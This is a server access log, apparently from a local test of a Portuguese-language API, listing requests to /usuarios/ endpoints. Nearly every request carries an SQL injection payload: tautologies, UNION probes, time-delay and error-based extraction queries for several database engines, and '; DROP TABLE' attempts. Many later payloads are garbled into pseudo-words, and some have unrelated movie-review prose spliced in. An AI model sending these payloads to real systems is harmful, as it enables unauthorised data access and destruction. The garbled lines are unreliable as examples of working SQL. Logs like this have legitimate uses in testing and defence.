Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test1'%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char%20( HTTP/1.1
172.18.0.1 - GET /usuarios/test-2580%25')))%20or%20elt(5973=5869,5869)%20and%20((('%25'=' HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20as%20jmop%20where%209758%20=%209758%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25'%20)%20)%20)%20procedure%20analyse%20(%20extractvalue%20(%209255,concat%20(%200x5c,%20(%20benchmark%20(%205000000,md5%20(%200x52515a50%20)%20)%20)%20)%20)%20,1%20)%20and%20(%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /usuarios/test1'+%20(%20select%20'vedi'%20where%202774%20=%202774%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20)%20or%206793%20=%20(%20select%206793%20from%20pg_sleep%20(%205%20)%20)%20and%20(%20(%203069%20=%203069 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20as%20rqeb%20where%202378%20=%203278 HTTP/1.1
172.18.0.1 - GET /usuarios/test-6802%20)%20as%20coyv%20where%205693%20=%205693%20or%208571%20=%208571%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20svtm%20where%207627%20=%207627%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20and%20(%20(%20(%20'vcgc'%20like%20'vcgc HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25'%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20as%20qcgf%20where%209656%20=%209656%20or%205356%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'+%20(%20select%20'gmpn'%20where%208137%20=%208137%20or%20sleep%20(%205%20)%20)%20+' HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22;@%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20)%20as%20tziq%20where%205674%20=%205674%20and%203580%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20and%203824%20=%20benchmark%20(%205000000,md5%20(%200x76555642%20)%20)%20and%20(%20(%20%22alkz%22%20=%20%22alkz HTTP/1.1
172.18.0.1 - GET /usuarios/test1)%20where%204710=4710%20procedure%20analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select%20(case%20when%20(5840=5840)%20then%201%20else%200%20end)),0x717a767a71)),1)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%25%22%20)%20)%20or%204240%20=%20(%20select%204240%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a HTTP/1.1
172.18.0.1 - GET /usuarios/test-7633'%20)%20as%20aslj%20where%202317%20=%202317%20or%208571%20=%208571%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20where%206941%20=%206941%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20and%20sleep%20(%205%20)%20and%20(%20'orxt'%20=%20'orxt%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20where%208732%20=%208732 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20and%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%203484%20=%203484,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20)%20)%20and%20(%20(%20%22qgle%22%20like%20%22qgle HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20tUAL HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lyse%20:rom$tabmet%20char%20)%2012,1%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alecture)%20end%20)%20+' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verale%20wastenedtemaye',int%20)%20 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;%20)%20)%20;'wait HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LiKE%20'3'%20%7C%7C%20'i'%20NOT%20LIKE%20'I HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscolame%20)%20FroM%20(%20SELECT%20@@vErsion%20)%20,(SELECT%20(SELECT%20(SELECT%20(SELECT%200))))%20)%20and%20'y'='y'%20AND%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20converseantelet'%20)%20vertion_tabe_all HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20,%20users,gverpabp_race_table_anctibl_gp_sger_tades_gars%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbvi HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;1%20and%20'vevil%20lekev5818%20from%20vusers%20an%20(%20segect/**/ HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charent$$):loc_par_%20From%20dbachancharacherA HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20verseoncmateine%20(%20',%20(,,@@(%20,aSECHEN/*CAS*/**/%20)%20FROM%20SYSusERs%20AS%20sYs1,SYSuSerS%20as%20SyS2,SysusERS%20as%20SYS0B10,SysusErS HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%202%20)%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20DVM/*I HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20%7C%7C%20'i'%20=%20' HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20(%20table_samerial,name_Nibl_%20)%20,vErsiMN%20(%20)%20AND%201%20iD%20=%201,1,1,1%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usern;tall_anc HTTP/1.1
172.18.0.1 - PUT /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gal_wabes%202%20)%20) HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%201,%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /usuarios/test';%20DROP%20TABLE%20SET%20AND%20'1'%20=%20'1'%20or%20'1'='1' HTTP/1.1
172.18.0.1 - PUT /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25%22%20)%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr HTTP/1.1
172.18.0.1 - PUT /usuarios/test-6721'%20)%20)%20)%20or%20make_set%20(%209354%20=%209354,7185%20)%20and%20(%20(%20(%20'bmth'%20=%20'bmrt HTTP/1.1
172.18.0.1 - PUT /usuarios/test-4462%25%22%20)%20or%208571%20=%208571%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test-4386'%20)%20as%20zfyf%20where%202975%20=%202975%20or%203038%20=%203038 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20and%20make_set%20(%201002%20=%203556,3556%20)%20and%20(%20(%20'mfao'%20=%20'mfao HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20%22hvwv%22%20=%20%22hvwv HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20where%208549%20=%208549%20order%20by%201 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20)%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20b HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20where%206082%20=%206082%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20or%206793%20=%20(%20select%206793%20from%20pg_sleep%20(%205%20)%20)%20and%20%22kojr%22%20=%20%22kojr HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_sets%20group%20by%20x%20)%20a%20)%20and%20'lywy'%20like%20'lywy--yus HTTP/1.1
172.18.0.1 - PUT /usuarios/test-8833'%20)%20)%20union%20all%20select%203227,3227,3227,3227,3227%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20as%20adzj%20where%205575%20=%205575%20or%208421%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20and%20elt%20(%204249%20=%204249,7259%20)%20and%20(%20'bkag'%20=%20'bkag HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20)%20)%20as%20htxh%20where%209648%20=%209648%20or%209323%20=%209323 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20as%20yiuk%20where%201790%20=%201790 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25%22%20)%20union%20all%20select%20null,null,null,null,null,null,null,null--It%20suckss,%20then%20working%20o%22...but%20i've%20seen%20a%20long%20time%20life%20on%20life.%20He%20finds%20the%20mind%20the%20movie%20and%20was%20just%20so%20directed%20by%20the%20same%20back%20when%20they%20father%20that%20he%20had%20been%20in%20the%20picture%20of HTTP/1.1
172.18.0.1 - PUT /usuarios/test-6515'%20)%20)%20)%20or%204144%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204144%20=%204144%20)%20then%201%20els HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%22%20where%205256%20=%205256 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%20)%20where%206035%20=%206035 HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25%22%20)%20)%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /usuarios/test-5218%22%20)%20union%20all%20select%201381,1381,1381,1381,1381%20-- HTTP/1.1
172.18.0.1 - PUT /usuarios/test-7112'%20or%20(%208459%20=%208459%20)%20*4906%20and%20'mftl'%20like%20'mtfl HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'))%20and%20(select%209067%20from(select%20count(*),concat(0x7171706a71,(select%20(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x%20from%20information_schema.character_sets%20group%20by%20x)a)%20and%20(('igoc'%20like%20'okco HTTP/1.1
172.18.0.1 - PUT /usuarios/test1'%20)%20)%20as%20cmll%20where%207948%20=%207948%20and%204386%20=%20utl_inaddr.get_host_address%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204386%20=%204386%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr HTTP/1.1
172.18.0.1 - PUT /usuarios/test1%25'%20)%20)%20and%205556%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20and%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20%3C)%20,2b0b1110101111%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;(%201,velcinc%20t2on),numeant%20as%20Bovin%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usern;tall_alcife HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'tucn' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20%3C)%20,2b1%20)%20anD%20'I'%20NOT%20likE%20'i'%20or%20fALse%20anD%20trUE%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20tabennem%20tering%20as%20'Farse%20that%20Passible%20pass112%20gettons%20toll%20that%20they%20aren't%20expect%20on%20the%20script.%20I%20don't%20think%20I've%20seen%20him%20insing%20a%20man%20who%20is%20simply%20don't%20work%20and%20I%20have%20to%20admit%20I've%20seen%20a%20huge%20bunks.%20I HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmate%20the%20(%202&%20&&%20thuen%20aND%20TRue%20OR%20False HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,call%20ing_nema);%20and%201,version%20(%20)%20AND%201%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@(%20,sleep(pa_tame_rest HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentytale%20)%20'ant'%20=%20'1,sigh HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%20's%20userin%20=%20'select'anse,gep%20(%20'and%20tubnen%20)%20,0b1%20) HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matebempelabes%20table;%20)%20; HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'limet'%20an HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20;%20as%20tibetame_tall_cibering,%20gaper%20ly%20(%20)%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncame%20)%20'%3E'%20',%20&&%20ttrue%20OR%20False%20AND%20True HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20usern;tel HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo''%20)%20,(SELecT%20(SELECT%201))%20-- HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char;ly$tybe_paba/**/ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20%7C%7C%20' HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20table_sccamedo_tabe;From%20vyse;)%20+ HTTP/1.1
172.18.0.1 - DELETE /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20chr%20(%20'1a/**/ HTTP/1.1
